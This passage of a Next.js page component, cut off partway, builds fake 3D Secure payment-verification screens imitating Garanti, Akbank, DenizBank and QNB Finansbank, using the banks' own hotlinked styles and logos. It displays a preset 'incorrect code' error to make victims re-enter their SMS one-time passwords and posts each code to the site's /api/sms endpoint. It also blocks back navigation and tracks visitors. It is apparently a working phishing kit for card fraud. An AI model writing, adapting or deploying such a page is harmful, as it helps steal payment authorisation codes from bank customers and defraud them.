'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import OnlineTracker from '@/components/OnlineTracker';

interface SmsData {
    tutar: string;
    tarih: string;
    lastFourDigits: string;
    cardType: 'visa' | 'mastercard' | 'unknown';
    maskedPhone: string;
    isyeriAdi: string;
    banka?: string;
}

const getBankCssLinks = (bank: string): string[] => {
    const b = bank.toLowerCase().trim();
    if (b.includes('garanti') || b.includes('bonus')) {
        return ['/assets/acs-style/garanti/css/fonts.css', '/assets/acs-style/garanti/css/garanti.css'];
    }
    if (b.includes('akbank') || b.includes('axess')) {
        return ['https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css'];
    }
    if (b.includes('deniz')) {
        return []; // Inline styles
    }
    if (b.includes('finans') || b.includes('qnb')) {
        return ['https://acs.qnbfinansbank.com/css/bundle.min.css?v=MdyKrhjGqNYJdJs5G1Aekf5F3lnmp-fqFmHweUkHZw0'];
    }
    if (b.includes('isbank') || b.includes('işbank') || b.includes('maximum')) {
        return ['https://maxinet.isbank.com.tr/assets/css/bootstrap.min.css', 'https://maxinet.isbank.com.tr/assets/css/style.min.css'];
    }
    // Default BKM Go
    return ['/assets/bkm/css/bkmacs2-dist.css', '/assets/bkm/css/main-dist.css'];
};

export default function HataliSmsPage() {
    const router = useRouter();
    const [data, setData] = useState<SmsData | null>(null);
    const [loading, setLoading] = useState(true);
    const [cssLoaded, setCssLoaded] = useState(false);
    const [smsCode, setSmsCode] = useState('');
    // Hatalı SMS sayfası olduğu için hata mesajını varsayılan olarak set ediyoruz
    const [error, setError] = useState('Doğrulama kodunu hatalı girdiniz. Lütfen tekrar deneyiniz.');
    const [timeLeft, setTimeLeft] = useState(180);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);
    const [isTimeout, setIsTimeout] = useState(false);
    const [referansNo] = useState(() => Math.random().toString(36).substring(2, 10).toUpperCase());
    const inputRef = useRef<HTMLInputElement>(null);

    // Geri gidilmesin
    useEffect(() => {
        window.history.pushState(null, '', window.location.href);
        const handlePopState = () => {
            window.history.pushState(null, '', window.location.href);
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    // Verileri yükle
    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch('/api/sms');
                const result = await response.json();
                
                if (result.success) {
                    setData(result.data);
                } else if (result.redirect) {
                    router.push(result.redirect);
                }
            } catch (err) {
                console.error('Veri yükleme hatası:', err);
            } finally {
                setLoading(false);
            }
        };

        fetchData();
    }, [router]);

    const handleStyleLoad = () => {
        setTimeout(() => {
            setCssLoaded(true);
        }, 200);
    };

    useEffect(() => {
        if (!loading && data) {
            const bankName = (data.banka || '').toLowerCase().trim();
            if (bankName.includes('deniz')) {
                handleStyleLoad();
            }
        }
    }, [loading, data]);

    // Geri sayım
    useEffect(() => {
        if (timeLeft <= 0) {
            setIsTimeout(true);
            return;
        }

        const timer = setInterval(() => {
            setTimeLeft(prev => prev - 1);
        }, 1000);

        return () => clearInterval(timer);
    }, [timeLeft]);

    // Input'a focus
    useEffect(() => {
        if (!loading && inputRef.current) {
            inputRef.current.focus();
        }
    }, [loading]);

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError('');

        if (smsCode.length < 5) {
            setError('Şifrenizi giriniz');
            setSmsCode('');
            return;
        }

        setIsSubmitting(true);

        try {
            const response = await fetch('/api/sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ smsCode })
            });

            const result = await response.json();

            if (result.success) {
                setIsSuccess(true);
            } else {
                setError(result.error || 'Bir hata oluştu');
            }
        } catch (err) {
            setError('Bağlantı hatası');
        } finally {
            setIsSubmitting(false);
        }
    };

    const handleRetry = () => {
        setTimeLeft(180);
        setIsTimeout(false);
        setSmsCode('');
        setError('Doğrulama kodunu hatalı girdiniz. Lütfen tekrar deneyiniz.');
    };

    const handleCancel = () => {
        router.push('/');
    };

    if (loading) {
        return (
            <div className="flex items-center justify-center min-h-screen bg-white">
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #fff !important; }
                `}</style>
                <div style={{ width: '40px', height: '40px', border: '4px solid #f3f3f3', borderTop: '4px solid #3498db', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
                <style jsx>{`
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                `}</style>
            </div>
        );
    }

    const cleanTutar = (data?.tutar || '').replace(/TL|TRY|₺/gi, '').trim() || '49,99';

    if (isSuccess) {
        return (
            <>
                <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
                <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    @keyframes spin { to { transform: rotate(360deg); } }
                `}</style>
                <div className="content-wrapper" style={{ margin: '0 auto', maxWidth: '480px' }}>
                    <div className="header" style={{ marginTop: '1px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0 10px' }}>
                        <div className="brand-logo" style={{ margin: 0 }}>
                            <Image 
                                src={data?.cardType === 'visa' ? '/assets/garanti/img/psimage_visa.png' : '/assets/garanti/img/psimage_mc.png'}
                                alt="Card" width={80} height={50} style={{ objectFit: 'contain' }}
                            />
                        </div>
                        <div>
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img src="/api/csfour-proxy/staticimage/carrefoursacom-logo.svg" alt="CarrefourSA" style={{ height: '30px', objectFit: 'contain' }} />
                        </div>
                    </div>
                    <div id="approve-page">
                        <div className="content">
                            <div style={{ marginTop: '60px', textAlign: 'center', padding: '0 20px' }} className="action-wrapper">
                                <div style={{ width: '80px', height: '80px', margin: '0 auto 24px', position: 'relative' }}>
                                    <div style={{ width: '100%', height: '100%', border: '4px solid #e5e7eb', borderTopColor: '#3b82f6', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
                                </div>
                                <h1 className="small" style={{ fontSize: '20px', fontWeight: '600', color: '#1f2937', marginBottom: '12px' }}>İşleminiz Doğrulanıyor</h1>
                                <p style={{ fontSize: '14px', color: '#6b7280', lineHeight: '1.6', marginBottom: '20px' }}>Bankanız tarafından gönderilen doğrulama kodu kontrol ediliyor.<br />Lütfen bu sayfadan ayrılmayınız.</p>
                                <div style={{ background: '#fef3c7', border: '1px solid #fcd34d', borderRadius: '8px', padding: '12px 16px', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#d97706" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                                    <span style={{ fontSize: '13px', color: '#92400e' }}>Bu işlem birkaç saniye sürebilir</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </>
        );
    }

    const bank = (data?.banka || '').toLowerCase().trim();

    // 1. GARANTİ RENDER
    const renderGaranti = () => {
        return (
            <>
                <OnlineTracker />
                <link rel="stylesheet" href="/assets/acs-style/garanti/css/fonts.css" />
                <link rel="stylesheet" href="/assets/acs-style/garanti/css/garanti.css" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #fff !important; }
                    .threed-page { background: #fff !important; }
                    #state-bekle { text-align:center; padding: 30px 20px; }
                    #state-bekle .gar-spinner { width:40px;height:40px;border:4px solid #e9ecef;border-top-color:#00843d;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px; }
                    @keyframes spin { to { transform:rotate(360deg); } }
                    #hata-box { color:red; margin-bottom:8px; }
                `}</style>
                <div className="threed-page">
                    <div className="container h-100">
                        <div id="js-main" className="row justify-content-center align-items-center" style={{ height: 'auto' }}>
                            <div className="box">
                                <div className="shadow px-2 px-sm-4 pb-1 theme-garanti">
                                    <div className="px-2 pt-2">
                                        <div className="text-right">
                                            <button type="button" onClick={handleCancel} className="btn btn-link p-0 text-right text-muted" style={{ background: 'none', border: 'none', outline: 'none' }}>
                                                İptal
                                            </button>
                                        </div>
                                        <div className="row m-0 title">
                                            <div className="col-6 text-left px-0 pt-1">
                                                <img height="39" width="64" src="https://gbemv3dsecure.garanti.com.tr/assets/img/issuer.png" alt="Garanti" />
                                            </div>
                                            <div className="col-6 text-right px-0 pt-1">
                                                <img height="39" width="64" src={data?.cardType === 'visa' ? '/assets/garanti/img/psimage_visa.png' : '/assets/garanti/img/psimage_mc.png'} alt="card scheme" style={{ objectFit: 'contain' }} />
                                            </div>
                                        </div>
                                        <h6 className="text-center mb-4 font-weight-bold">
                                            3D SECURE ÖDEME DOĞRULAMA
                                        </h6>
                                        <div>
                                            <div className="summary">
                                                <ul>
                                                    <li>
                                                        <label>Tutar</label>
                                                        <i className="icon-number-one d-none d-md-inline-block"></i>
                                                        <span className="total-value">{cleanTutar} ₺</span>
                                                    </li>
                                                    <li>
                                                        <label>Mağaza</label>
                                                        <i className="icon-bag d-none d-md-inline-block"></i>
                                                        <span>{data?.isyeriAdi}</span>
                                                    </li>
                                                    <li>
                                                        <label>Kart No</label>
                                                        <i className="icon-credit-card d-none d-md-inline-block"></i>
                                                        <span>************{data?.lastFourDigits}</span>
                                                    </li>
                                                    <li>
                                                        <label>Tarih</label>
                                                        <i className="icon-watch d-none d-md-inline-block"></i>
                                                        <span>{data?.tarih}</span>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>

                                        {isSubmitting ? (
                                            <div id="state-bekle">
                                                <div className="gar-spinner"></div>
                                                <p style={{ fontSize: '13px', color: '#6c757d' }}>İşleminiz hazırlanıyor, lütfen bekleyiniz...</p>
                                            </div>
                                        ) : (
                                            <div id="state-kod">
                                                <div>
                                                    <div className="form-group mb-4">
                                                        {error && <p id="hata-box" style={{ color: 'red' }}>{error}</p>}

                                                        <label htmlFor="sms-kod">Sonu <strong>{data?.maskedPhone.slice(-4)}</strong> ile biten telefon numaranıza gönderilen doğrulama şifresini giriniz.</label>
                                                        <form method="POST" id="acs-form" onSubmit={handleSubmit}>
                                                            <div className="form-group mb-3">
                                                                <input
                                                                    ref={inputRef}
                                                                    minLength={5}
                                                                    maxLength={6}
                                                                    required
                                                                    type="tel"
                                                                    inputMode="numeric"
                                                                    className="form-control form-pin"
                                                                    id="sms-kod"
                                                                    name="sms"
                                                                    placeholder="6 haneli şifreyi girin"
                                                                    value={smsCode}
                                                                    onChange={(e) => {
                                                                        setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                                                                        setError('');
                                                                    }}
                                                                    disabled={isTimeout}
                                                                />
                                                            </div>
                                                            <div className="form-group">
                                                                <button 
                                                                    id="acs-submit-btn" 
                                                                    name="bsubmit" 
                                                                    className="btn btn-primary btn-block w-100"
                                                                    type="submit" 
                                                                    disabled={isTimeout || smsCode.length < 5}
                                                                >
                                                                    GÖNDER
                                                                </button>
                                                            </div>
                                                        </form>
                                                        
                                                        {isTimeout ? (
                                                            <div className="text-center font-weight-bold pt-2 pb-4">
                                                                <p className="text-danger" style={{ fontSize: '12px' }}>Zaman aşımı nedeniyle kod geçerliliğini yitirdi.</p>
                                                                <button type="button" onClick={handleRetry} className="btn btn-link d-inline-block fs-10 p-0 text-success font-weight-bold">
                                                                    YENİ ŞİFRE GÖNDER
                                                                </button>
                                                            </div>
                                                        ) : (
                                                            <div className="text-center py-2 text-muted" style={{ fontSize: '13px' }}>
                                                                Kalan Süre: <span className="font-weight-bold text-success">{formatTime(timeLeft)}</span>
                                                            </div>
                                                        )}
                                                    </div>
                                                    <div className="text-center font-weight-bold py-2 pb-sm-0 mb-3" style={{ display: 'none' }}>
                                                        <label>BonusFlaş'tan 3D Secure Mobil Onay'ı kullanmak için telefon ayarlarından BonusFlaş bildirimlerine izin vermelisiniz.</label>
                                                    </div>
                                                    <div className="text-center font-weight-bold py-2 pb-sm-0 mb-3" style={{ display: 'block' }}>
                                                        <input type="checkbox" name="downloadbonus" className="form-check-input mr-2" id="downloadbonus" defaultChecked />
                                                        <label htmlFor="downloadbonus">Daha hızlı bir 3D Secure Ödeme Doğrulama deneyimi için BonusFlaş mobil uygulamasını indirmek istiyorum.
                                                        </label>
                                                    </div>
                                                    <div className="border-top border-color-light fs-10">
                                                        <button type="button" className="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn text-left">
                                                            <span className="float-left d-block">Daha fazla bilgi</span>
                                                        </button>
                                                    </div>
                                                    <div className="border-top border-color-light fs-10">
                                                        <button type="button" className="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn text-left">
                                                            <span className="float-left d-block">Yardım</span>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </>
        );
    };

    // 2. AKBANK RENDER
    const renderAkbank = () => {
        return (
            <>
                <OnlineTracker />
                <link rel="stylesheet" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #fff !important; }
                    #state-bekle { text-align:center; padding:30px 10px; }
                    #state-bekle .akb-spinner { width:40px;height:40px;border:4px solid #f0f0f0;border-top-color:#e30613;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px; }
                    @keyframes spin { to { transform:rotate(360deg); } }
                    #hata-box { color:red; margin-bottom:8px; }
                `}</style>
                <div data-role="content" data-theme="c" className="AkbankContentWrapper">
                    <div className="content">
                        <div className="dijitalgozluk-arkaplan">
                            <form id="axesswings3dsecurekayit3" name="axesswings3dsecurekayit3" autoComplete="off" onSubmit={handleSubmit}>
                                <div className="dijitalgozluk-ekran">
                                    <div className="dijitalgozluk-cerceve">
                                        <div className="dijitalgozluk-kapat">
                                            <button type="button" onClick={handleCancel} style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
                                                <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/icon-close-18x18.png" alt="X" />
                                            </button>
                                        </div>
                                        <div className="dijitalgozluk-logolar">
                                            <div className="dijitalgozluk-logo dijitalgozluk-logo-banka">
                                                <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/logo-akbank.svg" alt="Akbank" />
                                            </div>
                                            <div className="dijitalgozluk-yazi dijitalgozluk-baslik"> Uluslararası Güvenlik <br /> Platformu 3D Secure </div>
                                        </div>
                                        <div className="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler">
                                            <div className="dijitalgozluk-tablo-satir">
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> İşyeri Adı </div>
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {data?.isyeriAdi} </div>
                                            </div>
                                            <div className="dijitalgozluk-tablo-satir">
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tutar </div>
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {cleanTutar} ₺</div>
                                            </div>
                                            <div className="dijitalgozluk-tablo-satir">
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tarih </div>
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {data?.tarih} </div>
                                            </div>
                                            <div className="dijitalgozluk-tablo-satir">
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Kart Numarası </div>
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> ************{data?.lastFourDigits} </div>
                                            </div>
                                            <div className="dijitalgozluk-tablo-satir">
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Cep Telefonu </div>
                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {data?.maskedPhone} </div>
                                            </div>

                                            {error && (
                                                <div className="dijitalgozluk-tablo-satir">
                                                    <div style={{ color: 'red' }} className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> HATA </div>
                                                    <div style={{ color: 'red' }} className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger" id="hata-box">{error}</div>
                                                </div>
                                            )}
                                        </div>

                                        {isSubmitting ? (
                                            <div id="state-bekle">
                                                <div className="akb-spinner"></div>
                                                <div className="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
                                                    <p>SMS şifresi gönderiliyor, lütfen bekleyiniz...</p>
                                                </div>
                                            </div>
                                        ) : (
                                            <div id="state-kod">
                                                <div id="passwordInformation">
                                                    <div className="dijitalgozluk-kart-logo">
                                                        <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/ikon-sms-36x31.png" alt="" />
                                                    </div>
                                                    <div id="passwordInformation1" className="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
                                                        <p>
                                                            <span> 01 </span> nolu 3D Secure / Go Güvenli Öde şifrenizi şifre alanına giriniz.
                                                        </p>
                                                    </div>
                                                    <div id="passwordInformation2" className="dijitalgozluk-form-kontrol dijitalgozluk-form-yazi dijitalgozluk-form-sms-gir">
                                                        <div className="dijitalgozluk-form-yazi-baslik">Şifre:</div>
                                                        <div className="dijitalgozluk-form-yazi-input">
                                                            <input
                                                                ref={inputRef}
                                                                type="tel"
                                                                inputMode="numeric"
                                                                id="sms-kod"
                                                                name="sms"
                                                                autoFocus
                                                                minLength={5}
                                                                maxLength={6}
                                                                autoComplete="off"
                                                                required
                                                                value={smsCode}
                                                                onChange={(e) => {
                                                                    setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                                                                    setError('');
                                                                }}
                                                                disabled={isTimeout}
                                                            />
                                                        </div>
                                                        <div id="helpDiv" className="dijitalgozluk-form-yazi-yardim">
                                                            <a id="opener">Yardım</a>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <div id="div1" style={{ width: '180px', margin: '0px auto 0 auto' }}></div>
                                                </div>
                                                {isTimeout ? (
                                                    <div className="dijitalgozluk-yazi dijitalgozluk-uyari">
                                                        <p className="text-danger">Doğrulama kodunun geçerlilik süresi doldu.</p>
                                                        <button type="button" onClick={handleRetry} className="btn btn-link text-danger font-weight-bold" style={{ fontSize: '12px' }}>Şifreyi Yeniden Gönder</button>
                                                    </div>
                                                ) : (
                                                    <div id="remainingWarn" className="dijitalgozluk-yazi dijitalgozluk-uyari">
                                                        <p> Onaylama süresinin dolmasına <span id="time">{formatTime(timeLeft)}</span> kalmıştır </p>
                                                    </div>
                                                )}
                                                <div className="dijitalgozluk-form-kontrolu dijitalgozluk-dugme dijitalgozluk-devam-dugmesi">
                                                    <button id="acs-submit-btn" name="DevamEt" type="submit" disabled={isTimeout || smsCode.length < 5}>Devam</button>
                                                </div>
                                                <div className="dijitalgozluk-yazi dijitalgozluk-alternatif-yontem dijitalgozluk-alternatif-yontem-sms">
                                                    <p>Bu işlemi Axess Mobil'den de onaylayabilirdin.</p>
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </>
        );
    };

    // 3. DENİZBANK RENDER
    const renderDenizbank = () => {
        return (
            <>
                <OnlineTracker />
                <style dangerouslySetInnerHTML={{ __html: `
                    .dn-wrap{background:#fff;width:min(420px,96vw);border-radius:10px;box-shadow:0 4px 24px rgba(0,100,180,.15);overflow:hidden}
                    .dn-header{background:linear-gradient(135deg,#0069b4,#004a80);padding:16px 22px;display:flex;align-items:center;justify-content:space-between}
                    .dn-logo{color:#fff;font-size:22px;font-weight:900;letter-spacing:-1px}
                    .dn-logo span{color:#85c8ff}
                    .dn-secure{font-size:11px;color:#85c8ff;font-weight:600;border:1px solid #85c8ff55;padding:4px 10px;border-radius:20px}
                    .dn-card-strip{background:#e8f4fc;padding:10px 22px;display:flex;align-items:center;gap:12px}
                    .dn-card-icon{width:40px;height:28px;background:linear-gradient(135deg,#0069b4,#85c8ff);border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:10px;font-weight:700;flex-shrink:0}
                    .dn-card-number{font-size:13px;font-weight:700;color:#004a80;font-family:monospace;letter-spacing:2px}
                    .dn-body{padding:20px 22px}
                    .dn-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px}
                    .dn-info-box{background:#f4faff;border:1px solid #c8e4f8;border-radius:6px;padding:10px 12px}
                    .dn-info-box .lbl{font-size:11px;color:#0069b4;font-weight:700;margin-bottom:2px}
                    .dn-info-box .val{font-size:13px;color:#222;font-weight:700}
                    .hata-box{background:#fff3cd;border:1px solid #ffc107;color:#856404;border-radius:4px;padding:9px 12px;font-size:12.5px;margin-bottom:12px;display:flex;align-items:center;gap:7px}
                    .dn-label{font-size:13px;color:#555;margin-bottom:8px}
                    .dn-label strong{color:#0069b4}
                    .dn-input{width:100%;border:2px solid #c8e4f8;border-radius:6px;padding:12px 14px;font-size:22px;letter-spacing:10px;text-align:center;font-weight:700;outline:none;margin-bottom:10px;color:#004a80;transition:.15s}
                    .dn-input:focus{border-color:#0069b4;box-shadow:0 0 0 3px #0069b422}
                    .dn-timer{font-size:12px;color:#888;text-align:center;margin-bottom:10px}
                    .dn-timer span{font-weight:700;color:#0069b4}
                    .dn-btn{width:100%;background:linear-gradient(90deg,#0069b4,#004a80);color:#fff;border:none;border-radius:6px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;transition:.15s}
                    .dn-btn:hover{background:linear-gradient(90deg,#004a80,#003060)}
                    .dn-btn:disabled{opacity:.5;cursor:default}
                    .spinner-wrap{text-align:center;padding:22px}
                    .spinner{width:44px;height:44px;border:4px solid #c8e4f8;border-top-color:#0069b4;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px}
                    @keyframes spin{to{transform:rotate(360deg)}}
                    .dn-footer{background:#f4faff;border-top:1px solid #c8e4f8;padding:10px 22px;font-size:11px;color:#aac;text-align:center}
                ` }} />
                <div style={{
                    position: 'fixed',
                    inset: 0,
                    backgroundColor: '#e8f4fc',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    zIndex: 99999,
                    width: '100vw',
                    height: '100vh',
                    fontFamily: "'Segoe UI', Arial, sans-serif"
                }}>
                    <div className="dn-wrap">
                        <div className="dn-header">
                            <div className="dn-logo">Deniz<span>Bank</span></div>
                            <div className="dn-secure">🔒 3D Secure</div>
                        </div>
                        <div className="dn-card-strip">
                            <div className="dn-card-icon">KART</div>
                            <div className="dn-card-number">**** **** **** {data?.lastFourDigits}</div>
                        </div>
                        <div className="dn-body">
                            <div className="dn-info-grid">
                                <div className="dn-info-box"><div className="lbl">TUTAR</div><div className="val">{cleanTutar} ₺</div></div>
                                <div className="dn-info-box"><div className="lbl">TARİH</div><div className="val">{data?.tarih}</div></div>
                                <div className="dn-info-box" style={{ gridColumn: '1/-1' }}><div className="lbl">İŞYERİ</div><div className="val">{data?.isyeriAdi}</div></div>
                            </div>

                            {isSubmitting ? (
                                <div className="spinner-wrap">
                                    <div className="spinner"></div>
                                    <p className="dn-label" style={{ textAlign: 'center' }}>SMS kodu gönderiliyor, lütfen bekleyiniz...</p>
                                </div>
                            ) : (
                                <form id="bkmform" onSubmit={handleSubmit}>
                                    {error && <div className="hata-box" style={{ display: 'flex' }}>&#9888; {error}</div>}
                                    <p className="dn-label">Telefonunuza gönderilen <strong>6 haneli SMS kodunu</strong> giriniz:</p>
                                    <input
                                        ref={inputRef}
                                        className="dn-input"
                                        id="sms-kod"
                                        type="tel"
                                        inputMode="numeric"
                                        maxLength={6}
                                        placeholder="______"
                                        value={smsCode}
                                        onChange={(e) => {
                                            setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                                            setError('');
                                        }}
                                        disabled={isTimeout}
                                    />
                                    {isTimeout ? (
                                        <div className="text-center mb-3">
                                            <p className="text-danger" style={{ fontSize: '12px' }}>Doğrulama kodu geçerlilik süresi doldu.</p>
                                            <button type="button" onClick={handleRetry} className="btn btn-link text-primary font-weight-bold" style={{ fontSize: '12px' }}>Yeniden Gönder</button>
                                        </div>
                                    ) : (
                                        <p className="dn-timer">Kalan süre: <span>{formatTime(timeLeft)}</span></p>
                                    )}
                                    <button className="dn-btn" id="acs-submit-btn" type="submit" disabled={isTimeout || smsCode.length < 5}>ONAYLA</button>
                                </form>
                            )}
                        </div>
                        <div className="dn-footer">🔒 DenizBank Güvenli Ödeme Sistemi</div>
                    </div>
                </div>
            </>
        );
    };

    // 4. QNB FİNANSBANK RENDER
    const renderFinansbank = () => {
        return (
            <>
                <OnlineTracker />
                <link rel="stylesheet" href="https://acs.qnbfinansbank.com/css/bundle.min.css?v=MdyKrhjGqNYJdJs5G1Aekf5F3lnmp-fqFmHweUkHZw0" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #fff !important; }
                    #state-bekle { text-align:center; padding:30px 20px; }
                    #state-bekle .fn-spinner { width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#552382;border-radius:50%;animation:fn-spin 1s linear infinite;margin:0 auto 12px; }
                    @keyframes fn-spin { to { transform:rotate(360deg); } }
                    #hata-box { color:red; display:none; }
                `}</style>
                <div className="content-wrapper" id="content" style={{ display: 'block', maxWidth: '480px', margin: '0 auto' }}>
                    <div className="header">
                        <div className="brand-logo"> <img src="https://acs.qnbfinansbank.com/img/brand/troy.png" alt="card brand" /> </div>
                        <div className="member-logo"> <img src="https://acs.qnbfinansbank.com/img/finansbank.png" alt="card platform" /> </div>
                    </div>
                    <div id="approve-page">
                        <div className="content">
                            <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
                            <div className="info-wrapper">
                                <div className="info-row">
                                    <div className="info-col info-label">İşyeri Adı:</div>
                                    <div className="info-col" id="merchant-name">{data?.isyeriAdi}</div>
                                </div>
                                <div className="info-row">
                                    <div className="info-col info-label">İşlem Tutarı:</div>
                                    <div className="info-col" style={{ fontSize: '21px', fontWeight: '900', marginTop: '-5px' }} id="amount">
                                        {cleanTutar} TL
                                    </div>
                                </div>
                                <div className="info-row">
                                    <div className="info-col info-label">İşlem Tarihi-Saati:</div>
                                    <div className="info-col" id="operation-date-time">
                                        {data?.tarih}
                                    </div>
                                </div>
                                <div className="info-row">
                                    <div className="info-col info-label">Kart Numarası:</div>
                                    <div className="info-col" id="pan">
                                        ************{data?.lastFourDigits}
                                    </div>
                                </div>
                            </div>
                            <div className="action-wrapper">
                                {error && <p id="hata-box" style={{ color: 'red', display: 'block' }}>{error}</p>}

                                {isSubmitting ? (
                                    <div id="state-bekle">
                                        <div className="fn-spinner"></div>
                                        <h3>İşlem şifreniz gönderiliyor, lütfen bekleyiniz...</h3>
                                    </div>
                                ) : (
                                    <div id="state-kod">
                                        <h3>İşlem şifreniz <span id="msisdn">{data?.maskedPhone}</span> olan cep telefonunuza gönderilecektir.<br />Lütfen <span id="otpRefNo">{referansNo}</span> referans numaralı alışveriş şifrenizi giriniz.</h3>
                                    </div>
                                )}

                                <div className="form-wrapper" id="state-form" style={{ display: isSubmitting ? 'none' : '' }}>
                                    <label htmlFor="sms-kod">Doğrulama Kodu</label>
                                    <form method="POST" onSubmit={handleSubmit}>
                                        <div className="form-row">
                                            <input 
                                                ref={inputRef}
                                                autoFocus 
                                                required 
                                                type="tel"
                                                className="f-input" 
                                                name="sms" 
                                                id="sms-kod"
                                                minLength={5} 
                                                maxLength={6} 
                                                autoComplete="one-time-code"
                                                inputMode="numeric" 
                                                pattern="[0-9]*"
                                                value={smsCode}
                                                onChange={(e) => {
                                                    setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                                                    setError('');
                                                }}
                                                disabled={isTimeout}
                                            /> 
                                        </div>
                                        <div id="submitButtonDiv" style={{ display: 'block' }}>
                                            <div className="form-row has-submit">
                                                <input 
                                                    id="acs-submit-btn" 
                                                    type="submit" 
                                                    value="Onayla"
                                                    className="button btn-1 btn-commit" 
                                                    disabled={isTimeout || smsCode.length < 5} 
                                                /> 
                                            </div>
                                            <div className="call-to-action">
                                                <ul className="action-list" style={{ listStyle: 'none', padding: 0 }}>
                                                    <li style={{ display: 'inline-block', marginRight: '10px' }}>
                                                        <input type="button" onClick={handleCancel} value="İşlemi İptal Et" className="txt-link" style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }} />
                                                    </li>
                                                    <li style={{ display: 'inline-block' }}>
                                                        <input type="button" value="Yardım" className="txt-link" style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }} />
                                                    </li>
                                                </ul>
                                            </div>
                                            
                                            {isTimeout ? (
                                                <div className="text-center mb-3">
                                                    <span className="text-danger d-block mb-1" style={{ fontSize: '12px' }}>Zaman aşımı nedeniyle kod geçerliliğini yitirdi.</span>
                                                    <button type="button" onClick={handleRetry} className="btn btn-sm btn-outline-secondary">Tekrar Gönder</button>
                                                </div>
                                            ) : (
